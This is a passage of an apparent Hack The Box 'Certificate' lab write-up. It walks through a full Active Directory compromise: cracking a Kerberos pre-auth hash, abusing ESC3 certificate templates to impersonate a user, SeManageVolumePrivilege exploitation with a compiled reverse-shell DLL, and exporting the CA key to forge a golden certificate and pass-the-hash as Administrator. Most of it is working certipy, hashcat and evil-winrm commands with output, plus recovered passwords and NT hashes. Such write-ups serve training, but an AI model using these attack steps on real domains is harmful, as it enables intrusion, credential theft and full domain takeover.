# curl LOs https://raw.githubusercontent.com/jalvarezz13/Krb5RoastParser/refs/heads/main/krb5_roast_parser.py
└─$ py /opt/scripts/utils/krb5_roast_parser.py ./WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Looking at the [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) , the hash should contain DOMAIN.TLD, but this script didn't include TLD.

Replace `CERTIFICATE` with `CERTIFICATE.HTB`
```powershell
➜ .\hashcat.exe  -a 0 -m 19900 .\hashcat.txt .\rockyou.txt
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
```

> Creds; `Lion.sk:!QAZ2wsx`

### User.txt

```bash
*Evil-WinRM* PS C:\Users\Lion.SK> cat Desktop/user.txt
fcd6da5a1cbf3f5b802124193e9f4a3f
```

## Privilege Escalation

```powershell
*Evil-WinRM* PS C:\Users\Lion.SK> whoami /all
User Name           SID
=================== =============================================
certificate\lion.sk S-1-5-21-515537669-4223687196-3249690583-1115

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Domain CRA Managers            Group            S-1-5-21-515537669-4223687196-3249690583-1104 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### ESC3

We are part of some Certificate management groups, enumerate:
```bash
└─$ certipy-ad find -u 'Lion.sk' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ns 10.10.11.71 -dns-tcp -vulnerable -stdout -text
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP  Enabled                     : False
      HTTPS Enabled                     : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators, CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators, CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectAltRequireEmail, SubjectRequireEmail, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers, CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

- [https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-certificate-agent-eku](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-certificate-agent-eku)
- [https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/](https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/)

1. Use the vulnerable template to request a certificate for owned user
```bash
└─$ certipy-ad req -u 'Lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'dc01.certificate.htb' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

2. Issue a certificate on behalf of another user
```bash
└─$ certipy-ad req -u 'Lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'dc01.certificate.htb' -ca 'Certificate-LTD-CA' -template 'User' -on-behalf-of 'administrator' -pfx 'lion.sk.pfx'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[-] Got error while requesting certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.
Would you like to save the private key? (y/N): y
[*] Saving private key to '22.key'
[*] Wrote private key to '22.key'
[-] Failed to request certificate
```

The certificate was not successfully impersonated.

Save all enabled certificates and find the certificate which has `Client Authentication` permit.
```bash
└─$ certipy-ad find -u 'Lion.sk' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -enabled -text
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250711101911_Certipy.txt'
[*] Wrote text output to '20250711101911_Certipy.txt'

└─$ cat 20250711101911_Certipy.txt
...
  1
    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn, SubjectAltRequireEmail, SubjectRequireEmail, SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs, AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication, Secure Email, Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Domain Users, CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins, CERTIFICATE.HTB\Domain Users, CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.
...
```

`CERTSRV_E_SUBJECT_EMAIL_REQUIRED` error is raised.. which indicates that Administrator account is not available for use. >:(
```bash
└─$ certipy-ad req -u 'Lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'dc01.certificate.htb' -ca 'Certificate-LTD-CA' -template 'SignedUser' -on-behalf-of 'CERTIFICATE\Administrator' -pfx 'lion.sk.pfx'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 30
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
Would you like to save the private key? (y/N):
[-] Failed to request certificate
```

```bash
└─$ faketime -f +8h bloodhound-python -u 'Lion.sk@certificate.htb' -p '!QAZ2wsx' -ns '10.10.11.71' -d 'certificate.htb' -c all --zip -op lion.sk
└─$ ldapdomaindump -u 'CERTIFICATE.HTB\Lion.sk' -p '!QAZ2wsx' --no-json --no-grep dc01.certificate.htb
```

```bash
*Evil-WinRM* PS C:\Users\Lion.SK> ls ..
    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/30/2024   8:33 PM                Administrator # Disabled
d-----       11/23/2024   6:59 PM                akeder.kh     # ?
d-----        11/4/2024  12:55 AM                Lion.SK       # Pwned
d-r---        11/3/2024   1:05 AM                Public        # Public
d-----        11/3/2024   7:26 PM                Ryan.K        # ?
d-----       11/26/2024   4:12 PM                Sara.B        # Pwned
d-----       12/29/2024   5:30 PM                xamppuser     # Pwned
```

### Domain Storage Managers

Ryan has an odd group called **Domain Storage Managers** (also they can winrm)

![Writeup-8.png](/assets/pentest/htb/certificate/Writeup-8.png)

**Domain Storage Managers**: The members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks.

![Writeup-9.png](/assets/pentest/htb/certificate/Writeup-9.png)

```bash
└─$ certipy-ad req -u 'Lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'dc01.certificate.htb' -ca 'Certificate-LTD-CA' -template 'SignedUser' -on-behalf-of 'Ryan.K' -pfx 'lion.sk.pfx'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 31
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.K@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'

└─$ faketime -f +8h certipy-ad auth -pfx ryan.k.pfx -domain 'certificate.htb' -dc-ip '10.10.11.71'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Ryan.K@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

> Creds: `Ryan.K:b1bc3d70e70f4f36b1509a65ae1a2ae6`

### SeManageVolumePrivilege

```powershell
└─$ evil-winrm -i dc01.certificate.htb -u 'Ryan.K' -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6'
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /all
User Name          SID
================== =============================================
certificate\ryan.k S-1-5-21-515537669-4223687196-3249690583-1117

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Domain Storage Managers        Group            S-1-5-21-515537669-4223687196-3249690583-1118 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

[https://x.com/rootsecdev/status/1619522744818745347](https://x.com/rootsecdev/status/1619522744818745347) -> [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

![Writeup-10.png](/assets/pentest/htb/certificate/Writeup-10.png)

```powershell
└─$ curl -LOs https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

*Evil-WinRM* PS C:\Users\Ryan.K\Music> upload SeManageVolumeExploit.exe
*Evil-WinRM* PS C:\Users\Ryan.K\Music>.\SeManageVolumeExploit.exe
Entries changed: 845

DONE
```

Generate malicious DLL file
```bash
# https://github.com/gwillgues/Reverse-Shells.git
└─$ env GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w" -buildmode=c-shared -o revshell64.dll revshell_dll.go
```

Welp... the suggested exploit of dropping DLL doesn't work in this case.
```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Music> upload revshell64.dll
*Evil-WinRM* PS C:\Users\Ryan.K\Music> mv C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll.bak
Cannot find path 'C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll' because it does not exist.

*Evil-WinRM* PS C:\Users\Ryan.K\Music> mkdir -p C:\Windows\System32\spool\drivers\x64\3
*Evil-WinRM* PS C:\Users\Ryan.K\Music> mv .\revshell64.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll

*Evil-WinRM* PS C:\Users\Ryan.K\Music> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
*Evil-WinRM* PS C:\Users\Ryan.K\Music> $object = [Activator]::CreateInstance($type)
Exception calling "CreateInstance" with "1" argument(s): "Retrieving the COM class factory for component with CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} failed due to the following error: 80040154 Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))."
```

> Quick resource: [https://iptracej.gitbook.io/windows-linux-and-active-directory-ctf-notes/windows-priv/token-abuse/semanagevolumeprivilege#exploiting-semanagevolumeprivilege](https://iptracej.gitbook.io/windows-linux-and-active-directory-ctf-notes/windows-priv/token-abuse/semanagevolumeprivilege#exploiting-semanagevolumeprivilege)

We also can't seem to read files
```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Music> get-acl /Users/Administrator/Desktop/root.txt | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt
Owner  : BUILTIN\Users
Group  : CERTIFICATE\Domain Users
Access : CERTIFICATE\Administrator Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Users Allow  FullControl
         CERTIFICATE\Administrator Allow  FullControl
Audit  :
Sddl   : O:BUG:DUD:AI(A;;FA;;;LA)(A;ID;FA;;;SY)(A;ID;FA;;;BU)(A;ID;FA;;;LA)

*Evil-WinRM* PS C:\Users\Ryan.K\Music> cat /Users/Administrator/Desktop/root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
```

[Local Privilege Escalation with SeManageVolumePrivilege](https://youtu.be/gVLoHAl-8Z0) by [Grzegorz Tworek](https://www.youtube.com/@gtworek) also suggests the same thing, but with **edgeupdate**; However edgeupdate needs to be triggered by some other party.

Winpeas gets deleted >:(
```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Music> curl.exe 10.10.14.103/wp.exe -O
Program 'wpofs.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
```

So **Encrypted** attribute turns out to be the culprit for deny on read.

![Writeup-11.png](/assets/pentest/htb/certificate/Writeup-11.png)

Path for EFS Certificates (Current User):
```bash
%APPDATA%\Microsoft\SystemCertificates\My\Certificates
%APPDATA%\Microsoft\SystemCertificates\My\Keys

C:\Users\<Username>\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates
C:\Users\<Username>\AppData\Roaming\Microsoft\SystemCertificates\My\Keys
```

System-wide Certificates (Machine Context):
```
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
```

No errors, so we can read system-wide keys:
```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Music> cat \ProgramData\Microsoft\Crypto\RSA\MachineKeys\* > $null
```

### Golden Certificate Attack

[certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) can actually help here~
```powershell
*Evil-WinRM* PS C:\Users\Ryan.K\Music> certutil -store My

My "Personal"
================ Certificate 0 ================
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
  Provider = Microsoft RSA SChannel Cryptographic Provider
Private key is NOT exportable
Encryption test passed

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
CertUtil: -store command completed successfully.
```

- 0: **Root CA Certificate** likely trusted by the domain. Important for chain of trust.
- 1: **Domain Controller Authentication Certificate** used for DC authentication (Kerberos/LDAPS).
- 2: **Another Root CA Certificate** likely trusted. May be chain root for cert 1.

So turns out there's Golden tickets and then Golden **Certificates**! (Discovered after some hints/spoilers)

1. HackingArticles: [Domain Persistence: Golden Certificate Attack](https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/)
2. ["Certified Pre-Owned" whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf): [ForgeCert](https://github.com/GhostPack/ForgeCert)
3. The Hacker Recipes: [Golden certificate](https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate#theory)
	- [Certificate authority > Practice > Stolen CA](https://www.thehacker.recipes/ad/persistence/adcs/certificate-authority#stolen-ca)

```bash
*Evil-WinRM* PS C:\Users\Ryan.K\Music> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca ca.pfx
*Evil-WinRM* PS C:\Users\Ryan.K\Music> download ca.pfx

└─$ certipy-ad forge -ca-pfx "ca.pfx" -upn "administrator@certificate.htb" -subject "CN=Administrator,CN=Users,DC=CERTIFICATE,DC=HTB"
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
└─$ faketime -f +8h certipy-ad auth -pfx administrator_forged.pfx -domain 'certificate.htb' -dc-ip '10.10.11.71'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

### Root.txt

```bash
└─$ evil-winrm -i dc01.certificate.htb -u 'Administrator' -H 'd804304519bf0143c14cbf1c024408c6'
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
d35d404de3f8bcc459930f4bed20b910
```